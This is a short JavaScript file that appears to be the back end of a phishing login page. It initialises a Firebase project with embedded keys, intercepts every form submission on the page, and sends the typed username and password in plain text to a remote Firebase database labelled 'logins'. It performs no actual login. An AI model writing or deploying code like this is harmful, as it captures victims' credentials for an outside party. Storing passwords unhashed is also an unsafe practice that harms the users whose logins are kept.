import { initializeApp } from 'firebase/app'
import { getDatabase, ref, push, get, remove } from 'firebase/database'

const appSettings = {
    apiKey: "AIzaSyCRV4qSf3B5QKjrMP7zIDmXEAgHv6Fd-RY",
    authDomain: "safiny-387ba.firebaseapp.com",
    databaseURL: "https://safiny-387ba-default-rtdb.firebaseio.com",
    projectId: "safiny-387ba",
    storageBucket: "safiny-387ba.appspot.com",
    messagingSenderId: "332325490200",
    appId: "1:332325490200:web:9a8e4474d335a118cffd6d",
    measurementId: "G-C19PLYGTFY"
  };
const app = initializeApp(appSettings)
const database = getDatabase(app)
const logins = ref(database)


document.addEventListener('submit', (e) => {
    e.preventDefault()
    const user = document.getElementById('user-input-1')
    const password = document.getElementById('user-input-2')
    push(logins, {
        User: user.value,
        Password: password.value
    })
})
